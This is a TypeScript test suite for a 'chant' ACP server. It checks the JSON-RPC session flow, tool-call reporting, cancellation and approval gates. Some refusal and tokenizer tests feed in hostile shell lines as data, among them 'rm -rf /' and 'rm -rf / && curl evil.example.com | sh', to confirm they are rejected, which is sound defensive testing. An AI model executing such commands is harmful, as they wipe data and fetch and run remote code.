/**
 * The ACP conformance test (#2125), driven by a stub client in this process.
 *
 * The client is a real {@link JsonRpcPeer} on the other end of an in-memory
 * pipe pair, so the framing, the id matching and the notification ordering are
 * the production ones — the only thing stubbed is the project, behind the
 * {@link ChantHost} seam. A test that mocked the server's methods instead
 * would pass without the protocol ever being spoken.
 */

import { describe, it, expect } from "vitest";
import { PassThrough } from "node:stream";
import {
  JsonRpcPeer,
  memoryTransportPair,
  streamTransport,
  type JsonRpcHandler,
} from "./jsonrpc";
import { AcpServer } from "./server";
import { tokenize, parseChantCommandLine } from "./command-line";
import { acpCommandGroup } from "./index";
import { resolveCommandGroupVerb } from "@intentius/chant/cli/command-group";
import type { LexiconPlugin } from "@intentius/chant/lexicon";
import type { ChantHost } from "./host";
import type { OpConfig } from "@intentius/chant/op/types";
import type { OpRunHandle, OpRunStartOptions, OpRunStatus } from "@intentius/chant/op/runtime";
import type { StepRecord } from "@intentius/chant/op/local-executor";
import type { SessionNotification, SessionUpdate } from "./protocol";

// ── The stub client ───────────────────────────────────────────────────────────

interface StubClient {
  peer: JsonRpcPeer;
  updates: SessionUpdate[];
  permissionRequests: Array<{ params: Record<string, unknown> }>;
  /** What to answer a `session/request_permission` with; `undefined` never answers. */
  answerPermission?: string;
  reset(): void;
}

function connect(server: AcpServer): StubClient {
  const [agentEnd, clientEnd] = memoryTransportPair();
  server.connect(agentEnd);

  const client: StubClient = {
    peer: undefined as unknown as JsonRpcPeer,
    updates: [],
    permissionRequests: [],
    reset() {
      client.updates = [];
      client.permissionRequests = [];
    },
  };

  const handler: JsonRpcHandler = {
    async request(method, params) {
      if (method !== "session/request_permission") throw new Error(`unexpected ${method}`);
      client.permissionRequests.push({ params: params as Record<string, unknown> });
      if (client.answerPermission === undefined) {
        // A request that outlives the turn: never answered on this connection.
        return new Promise(() => undefined);
      }
      return { outcome: { outcome: "selected", optionId: client.answerPermission } };
    },
    notify(method, params) {
      if (method !== "session/update") return;
      client.updates.push((params as SessionNotification).update);
    },
  };

  client.peer = new JsonRpcPeer(clientEnd, handler);
  return client;
}

const text = (updates: SessionUpdate[]): string =>
  updates
    .filter((u) => u.sessionUpdate === "agent_message_chunk")
    .map((u) => (u as { content: { text: string } }).content.text)
    .join("");

const toolCalls = (updates: SessionUpdate[]): Array<{ toolCallId: string; title: string }> =>
  updates.filter((u) => u.sessionUpdate === "tool_call") as Array<{
    toolCallId: string;
    title: string;
    sessionUpdate: "tool_call";
  }>;

const toolUpdates = (updates: SessionUpdate[]): Array<{ toolCallId: string; status: string }> =>
  updates.filter((u) => u.sessionUpdate === "tool_call_update") as Array<{
    toolCallId: string;
    status: string;
    sessionUpdate: "tool_call_update";
  }>;

// ── The stub host ─────────────────────────────────────────────────────────────

const DEMO_OP: OpConfig = {
  name: "demo-op",
  overview: "A two-phase op with a gate",
  labels: { Env: "prod" },
  phases: [
    { name: "plan", steps: [{ kind: "activity", fn: "terraformPlan", args: { root: "prod" } }] },
    {
      name: "apply",
      steps: [
        { kind: "gate", gate: "deploy", description: "Ship it?" },
        { kind: "activity", fn: "terraformApply", args: { root: "prod" } },
      ],
    },
  ],
  onFailure: [{ name: "rollback", steps: [{ kind: "activity", fn: "terraformRollback", args: {} }] }],
};

interface StubHostOptions {
  /** Records the run emits through `progress`, in order. */
  records?: StepRecord[];
  /** The status the run settles with. */
  status?: Partial<OpRunStatus>;
  /** Block after the first record until cancelled, then emit an `onFailure` record. */
  blockUntilCancelled?: boolean;
  /** What a non-`run` verb prints and exits with. */
  verb?: { stdout: string; exitCode: number };
  /** Files the `*.op.ts` scan could not read. */
  discoveryErrors?: string[];
}

interface StubHost extends ChantHost {
  started: string[];
  verbsRun: string[];
  resolvedGates: Array<{ op: string; gate: string; by: string }>;
  firstStep: Promise<void>;
}

function stubHost(opts: StubHostOptions = {}): StubHost {
  let announceFirstStep!: () => void;
  const firstStep = new Promise<void>((resolve) => {
    announceFirstStep = resolve;
  });

  const host: StubHost = {
    cwd: process.cwd(),
    started: [],
    verbsRun: [],
    resolvedGates: [],
    firstStep,

    async findOp(name) {
      return {
        ...(name === DEMO_OP.name ? { config: DEMO_OP } : {}),
        names: [DEMO_OP.name],
        errors: opts.discoveryErrors ?? [],
      };
    },
    async startOp(op: OpConfig, start: OpRunStartOptions): Promise<OpRunHandle> {
      host.started.push(op.name);
      const runId = "run-1";
      const settled = (async (): Promise<OpRunStatus> => {
        const records = opts.records ?? [];
        for (const record of records) {
          start.progress?.(record);
          announceFirstStep();
          if (opts.blockUntilCancelled) break;
        }

        if (opts.blockUntilCancelled) {
          await new Promise<void>((resolve) => {
            if (start.signal?.aborted) resolve();
            else start.signal?.addEventListener("abort", () => resolve(), { once: true });
          });
          // The executor's own abort path: the in-flight step fails and the
          // Op's `onFailure` phases run before the run settles.
          start.progress?.({
            phase: "plan",
            fn: "terraformPlan",
            args: {},
            status: "fail",
            durationMs: 5,
            error: "aborted",
          });
          start.progress?.({
            phase: "rollback",
            fn: "terraformRollback",
            args: {},
            status: "ok",
            durationMs: 1,
          });
          return {
            op: op.name,
            runId,
            state: "failed",
            startedAt: "2026-09-06T00:00:00.000Z",
            endedAt: "2026-09-06T00:00:01.000Z",
          };
        }

        return {
          op: op.name,
          runId,
          state: "completed",
          startedAt: "2026-09-06T00:00:00.000Z",
          endedAt: "2026-09-06T00:00:02.000Z",
          ...opts.status,
        } as OpRunStatus;
      })();
      return { op: op.name, runId, result: () => settled };
    },
    async runVerb(command) {
      host.verbsRun.push(command.argv.join(" "));
      if (opts.verb) process.stdout.write(opts.verb.stdout);
      return opts.verb?.exitCode ?? 0;
    },
    async resolveGate(op, gate, by) {
      host.resolvedGates.push({ op, gate, by });
    },
  };
  return host;
}

const okRecords: StepRecord[] = [
  { phase: "plan", fn: "terraformPlan", args: { root: "prod" }, status: "ok", durationMs: 12 },
  {
    phase: "apply",
    fn: "gate:deploy",
    args: {},
    status: "ok",
    durationMs: 1,
    approval: { gate: "deploy", resolvedBy: "alex", timestamp: "2026-09-06T00:00:00.000Z" },
  },
  { phase: "apply", fn: "terraformApply", args: { root: "prod" }, status: "ok", durationMs: 40 },
];

async function open(
  server: AcpServer,
): Promise<{ client: StubClient; sessionId: string }> {
  const client = connect(server);
  await client.peer.request("initialize", { protocolVersion: 1 });
  const { sessionId } = (await client.peer.request("session/new", {
    cwd: process.cwd(),
    mcpServers: [],
  })) as { sessionId: string };
  client.reset();
  return { client, sessionId };
}

const promptOf = (t: string): Array<{ type: "text"; text: string }> => [{ type: "text", text: t }];

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("tokenize", () => {
  it("splits on whitespace and honours quotes", () => {
    expect(tokenize(`chant run prod-apply --env prod`)).toEqual([
      "chant", "run", "prod-apply", "--env", "prod",
    ]);
    expect(tokenize(`chant lint --path "my dir/stack"`)).toEqual([
      "chant", "lint", "--path", "my dir/stack",
    ]);
    expect(tokenize(`a 'b c' d`)).toEqual(["a", "b c", "d"]);
  });

  it("expands nothing — a command line is not a shell line", () => {
    expect(tokenize(`chant lint $HOME && rm -rf /`)).toEqual([
      "chant", "lint", "$HOME", "&&", "rm", "-rf", "/",
    ]);
  });

  it("refuses an unterminated quote rather than silently joining", () => {
    expect(() => tokenize(`chant lint "unclosed`)).toThrow(/unterminated/);
  });
});

describe("streamTransport", () => {
  it("keeps writing to the stream it was built on after write is replaced", () => {
    // The regression this exists for: a turn replaces `process.stdout.write`
    // to stream a command's output, and a transport that looked the method up
    // per call would send every protocol line back through the interceptor —
    // one notification, then its echo, then its echo, until V8 gives up.
    const real: string[] = [];
    const intercepted: string[] = [];
    const out = { write: (chunk: string) => real.push(chunk) };

    const transport = streamTransport(
      new PassThrough(),
      out as unknown as Parameters<typeof streamTransport>[1],
    );
    out.write = (chunk: string) => intercepted.push(chunk);

    transport.send('{"jsonrpc":"2.0"}');
    expect(real).toEqual(['{"jsonrpc":"2.0"}\n']);
    expect(intercepted).toEqual([]);
  });
});

describe("parseChantCommandLine", () => {
  it("accepts a chant verb from core's own registry", async () => {
    const parsed = await parseChantCommandLine("chant lifecycle diff --live");
    expect(parsed.ok).toBe(true);
    if (parsed.ok) expect(parsed.command.kind).toBe("verb");
  });

  it("routes a bare `chant run <op>` to the op-run path", async () => {
    const parsed = await parseChantCommandLine("chant run prod-apply --env prod");
    expect(parsed.ok).toBe(true);
    if (parsed.ok && parsed.command.kind === "op-run") {
      expect(parsed.command.op).toBe("prod-apply");
      expect(parsed.command.args.env).toBe("prod");
    } else {
      throw new Error("expected an op-run command");
    }
  });

  it("keeps `chant run list` an ordinary verb", async () => {
    const parsed = await parseChantCommandLine("chant run list");
    expect(parsed.ok).toBe(true);
    if (parsed.ok) expect(parsed.command.kind).toBe("verb");
  });

  it("refuses anything that is not a chant verb", async () => {
    const parsed = await parseChantCommandLine("rm -rf /");
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.message).toContain("not a chant command");
  });
});

describe("chant acp", () => {
  it("answers initialize and opens a session with a cwd", async () => {
    const server = new AcpServer({ createHost: () => stubHost(), version: "1.2.3" });
    const client = connect(server);

    const init = (await client.peer.request("initialize", {
      protocolVersion: 1,
      clientCapabilities: { fs: { readTextFile: true } },
    })) as Record<string, unknown>;

    expect(init.protocolVersion).toBe(1);
    expect(init.agentInfo).toEqual({ name: "chant", title: "chant", version: "1.2.3" });
    expect(init.agentCapabilities).toMatchObject({
      loadSession: false,
      promptCapabilities: { image: false, audio: false, embeddedContext: false },
    });

    const session = (await client.peer.request("session/new", {
      cwd: "/tmp/some-project",
      mcpServers: [{ name: "ignored" }],
    })) as { sessionId: string };
    expect(typeof session.sessionId).toBe("string");
    expect(session.sessionId.length).toBeGreaterThan(0);
  });

  it("hands a session its own cwd", async () => {
    const seen: string[] = [];
    const server = new AcpServer({
      createHost: (cwd) => {
        seen.push(cwd);
        return stubHost();
      },
    });
    const client = connect(server);
    await client.peer.request("initialize", {});
    await client.peer.request("session/new", { cwd: "/tmp/project-a" });
    expect(seen).toEqual(["/tmp/project-a"]);
  });

  it("rejects an unknown method with -32601", async () => {
    const server = new AcpServer({ createHost: () => stubHost() });
    const client = connect(server);
    await expect(client.peer.request("session/teleport", {})).rejects.toThrow(/method not found/);
  });

  it("emits one tool_call per declared step and an update per settled step", async () => {
    const host = stubHost({ records: okRecords });
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run demo-op --env prod"),
    })) as { stopReason: string };

    expect(result.stopReason).toBe("end_turn");
    expect(host.started).toEqual(["demo-op"]);

    // The plan, in declaration order.
    expect(toolCalls(client.updates).map((c) => c.title)).toEqual([
      "plan / terraformPlan",
      "apply / gate:deploy",
      "apply / terraformApply",
    ]);

    // One update per settled step, matched back onto its declaration.
    const calls = toolCalls(client.updates);
    expect(toolUpdates(client.updates)).toEqual([
      { sessionUpdate: "tool_call_update", toolCallId: calls[0].toolCallId, status: "completed", rawOutput: expect.anything() },
      { sessionUpdate: "tool_call_update", toolCallId: calls[1].toolCallId, status: "completed", rawOutput: expect.anything() },
      { sessionUpdate: "tool_call_update", toolCallId: calls[2].toolCallId, status: "completed", rawOutput: expect.anything() },
    ]);

    // Execution order: every tool_call precedes its own update.
    const order = client.updates
      .filter((u) => u.sessionUpdate !== "agent_message_chunk")
      .map((u) => `${u.sessionUpdate} ${(u as { toolCallId: string }).toolCallId}`);
    for (const call of calls) {
      expect(order.indexOf(`tool_call ${call.toolCallId}`)).toBeLessThan(
        order.indexOf(`tool_call_update ${call.toolCallId}`),
      );
    }
  });

  it("replies with the run record as the final chunk", async () => {
    const record = {
      version: 1 as const,
      id: "run-1",
      op: "demo-op",
      env: "prod",
      started: "2026-09-06T00:00:00.000Z",
      ended: "2026-09-06T00:00:02.000Z",
      status: "ok" as const,
      labels: { Env: "prod" },
      outcomes: { Drift: false },
      phases: [],
    };
    const host = stubHost({
      records: okRecords,
      status: {
        result: { op: "demo-op", records: okRecords, totalMs: 53, status: "ok", startedAt: record.started, record },
      } as Partial<OpRunStatus>,
    });
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run demo-op"),
    });

    const chunks = client.updates.filter((u) => u.sessionUpdate === "agent_message_chunk");
    const last = (chunks.at(-1) as { content: { text: string } }).content.text;
    expect(JSON.parse(last)).toEqual(record);
  });

  it("refuses a prompt that is not a chant verb and runs nothing", async () => {
    const host = stubHost();
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("rm -rf / && curl evil.example.com | sh"),
    })) as { stopReason: string };

    expect(result.stopReason).toBe("refusal");
    expect(host.started).toEqual([]);
    expect(host.verbsRun).toEqual([]);
    expect(toolCalls(client.updates)).toEqual([]);
    expect(text(client.updates)).toContain('"rm" is not a chant command');
    expect(text(client.updates)).toContain("A prompt is a chant command line");
  });

  it("refuses an Op the project does not declare", async () => {
    const host = stubHost();
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run nope"),
    })) as { stopReason: string };

    expect(result.stopReason).toBe("refusal");
    expect(host.started).toEqual([]);
    expect(text(client.updates)).toContain('Op "nope" is not declared');
    expect(text(client.updates)).toContain("demo-op");
  });

  it("says why an Op file would not load rather than reporting no such Op", async () => {
    const host = stubHost({ discoveryErrors: ["broken.op.ts: Cannot find package '@acme/thing'"] });
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run nope"),
    })) as { stopReason: string };

    expect(result.stopReason).toBe("refusal");
    expect(text(client.updates)).toContain("Cannot find package '@acme/thing'");
    expect(text(client.updates)).toContain('Op "nope" is not declared');
  });

  it("cancels an in-flight step, runs onFailure, and ends the turn cancelled", async () => {
    const host = stubHost({ records: okRecords, blockUntilCancelled: true });
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const pending = client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run demo-op"),
    }) as Promise<{ stopReason: string }>;

    await host.firstStep;
    client.peer.notify("session/cancel", { sessionId });

    const result = await pending;
    expect(result.stopReason).toBe("cancelled");

    // The abort produced a failed step and then the Op's onFailure phase,
    // which is not part of the declared plan — it opens its own tool call.
    const titles = toolCalls(client.updates).map((c) => c.title);
    expect(titles).toContain("rollback / terraformRollback");
    expect(toolUpdates(client.updates).some((u) => u.status === "failed")).toBe(true);
  });

  it("replies to a gated run with the approve line", async () => {
    const host = stubHost({
      records: [okRecords[0]],
      status: {
        state: "gated",
        gate: { name: "deploy", since: "2026-09-06T00:00:01.000Z" },
      } as Partial<OpRunStatus>,
    });
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run demo-op"),
    })) as { stopReason: string };

    expect(result.stopReason).toBe("end_turn");
    expect(text(client.updates)).toContain("chant approve demo-op deploy");
    expect(client.permissionRequests).toEqual([]);

    // A step the run never reached is settled rather than left spinning.
    expect(toolUpdates(client.updates).length).toBe(toolCalls(client.updates).length);
  });

  it("asks for permission and waits under --durable-requests, then completes on resume", async () => {
    let gated = true;
    const gatedHost = stubHost({
      records: [okRecords[0]],
      status: {
        state: "gated",
        gate: { name: "deploy", since: "2026-09-06T00:00:01.000Z" },
      } as Partial<OpRunStatus>,
    });
    const doneHost = stubHost({ records: okRecords });
    // One host per session in production; here the same session swaps its
    // answer once the gate is resolved, which is what a re-run observes.
    const host: ChantHost = {
      cwd: process.cwd(),
      findOp: (n) => gatedHost.findOp(n),
      startOp: (op, o) => (gated ? gatedHost.startOp(op, o) : doneHost.startOp(op, o)),
      runVerb: (c, s) => gatedHost.runVerb(c, s),
      resolveGate: async (op, gate, by) => {
        gatedHost.resolvedGates.push({ op, gate, by });
        gated = false;
      },
    };

    const server = new AcpServer({
      createHost: () => host,
      durableRequests: true,
      newRequestId: () => "req-1",
    });
    const { client, sessionId } = await open(server);

    const first = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run demo-op --env prod"),
    })) as { stopReason: string };

    expect(first.stopReason).toBe("waiting");
    expect(client.permissionRequests).toHaveLength(1);
    const params = client.permissionRequests[0].params as {
      options: Array<{ optionId: string; kind: string }>;
      toolCall: { toolCallId: string };
    };
    expect(params.options.map((o) => o.kind)).toEqual(["allow_once", "reject_once"]);
    expect(params.toolCall.toolCallId).toBe("req-1");

    client.reset();
    const second = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf(""),
      _meta: { chant: { permission: { requestId: "req-1", optionId: "allow" } } },
    })) as { stopReason: string };

    expect(second.stopReason).toBe("end_turn");
    expect(gatedHost.resolvedGates).toEqual([
      { op: "demo-op", gate: "deploy", by: "chant-acp" },
    ]);
    expect(text(client.updates)).toContain('Gate "deploy" resolved by chant-acp');
    expect(doneHost.started).toEqual(["demo-op"]);
  });

  it("rejects a gate on resume without running anything", async () => {
    const host = stubHost({
      records: [okRecords[0]],
      status: {
        state: "gated",
        gate: { name: "deploy", since: "2026-09-06T00:00:01.000Z" },
      } as Partial<OpRunStatus>,
    });
    const server = new AcpServer({
      createHost: () => host,
      durableRequests: true,
      newRequestId: () => "req-2",
    });
    const { client, sessionId } = await open(server);

    await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run demo-op"),
    });
    client.reset();

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf(""),
      _meta: { chant: { permission: { requestId: "req-2", optionId: "reject" } } },
    })) as { stopReason: string };

    expect(result.stopReason).toBe("end_turn");
    expect(host.resolvedGates).toEqual([]);
    expect(host.started).toEqual(["demo-op"]);
    expect(text(client.updates)).toContain("was rejected");
  });

  it("runs another chant verb and streams its stdout as the reply", async () => {
    const host = stubHost({ verb: { stdout: '{"drifted":true}\n', exitCode: 0 } });
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant lifecycle diff --live"),
    })) as { stopReason: string };

    expect(result.stopReason).toBe("end_turn");
    expect(host.verbsRun).toEqual(["lifecycle diff --live"]);
    expect(text(client.updates)).toContain('{"drifted":true}');
    expect(toolCalls(client.updates).map((c) => c.title)).toEqual([
      "chant lifecycle diff --live",
    ]);
    expect(toolUpdates(client.updates).map((u) => u.status)).toEqual(["completed"]);
  });

  it("marks a non-zero verb exit as a failed tool call", async () => {
    const host = stubHost({ verb: { stdout: "", exitCode: 2 } });
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant lint"),
    });

    expect(toolUpdates(client.updates).map((u) => u.status)).toEqual(["failed"]);
    expect(text(client.updates)).toContain("exited 2");
  });

  it("reports a thrown command as the turn's outcome, not as a protocol error", async () => {
    // `discoverOps` throws outside a checkout, and a client that gets a
    // JSON-RPC error for `session/prompt` has been told the protocol failed.
    const host = stubHost();
    host.findOp = async () => {
      throw new Error("Not in a git repository");
    };
    const server = new AcpServer({ createHost: () => host });
    const { client, sessionId } = await open(server);

    const result = (await client.peer.request("session/prompt", {
      sessionId,
      prompt: promptOf("chant run demo-op"),
    })) as { stopReason: string };

    expect(result.stopReason).toBe("refusal");
    expect(text(client.updates)).toContain("Not in a git repository");
  });

  it("refuses a prompt on a session it never opened", async () => {
    const server = new AcpServer({ createHost: () => stubHost() });
    const client = connect(server);
    await client.peer.request("initialize", {});
    await expect(
      client.peer.request("session/prompt", { sessionId: "nope", prompt: promptOf("chant lint") }),
    ).rejects.toThrow(/unknown session/);
  });

  it("never puts the environment it inherits into the transcript", async () => {
    // A step's output is streamed verbatim — redaction belongs to the thread
    // that stores it, and fountain redacts on the way in. What the server
    // must never do is add the environment to that output itself.
    process.env.CHANT_ACP_TEST_SECRET = "s3cr3t-value-nobody-asked-for";
    try {
      const host = stubHost({ records: okRecords });
      const server = new AcpServer({ createHost: () => host });
      const { client, sessionId } = await open(server);

      await client.peer.request("session/prompt", {
        sessionId,
        prompt: promptOf("chant run demo-op"),
      });

      const transcript = JSON.stringify(client.updates);
      expect(transcript).not.toContain("s3cr3t-value-nobody-asked-for");
      expect(transcript).not.toContain("CHANT_ACP_TEST_SECRET");
    } finally {
      delete process.env.CHANT_ACP_TEST_SECRET;
    }
  });

  it("mounts as a command group whose bare name serves", () => {
    const group = acpCommandGroup();
    expect(group.name).toBe("acp");
    expect(group.defaultVerb).toBe("serve");
    const lookup = resolveCommandGroupVerb(
      [{ name: "fountain", commands: () => group } as unknown as LexiconPlugin],
      "acp",
      group.defaultVerb,
    );
    expect(lookup.kind).toBe("matched");
  });
});
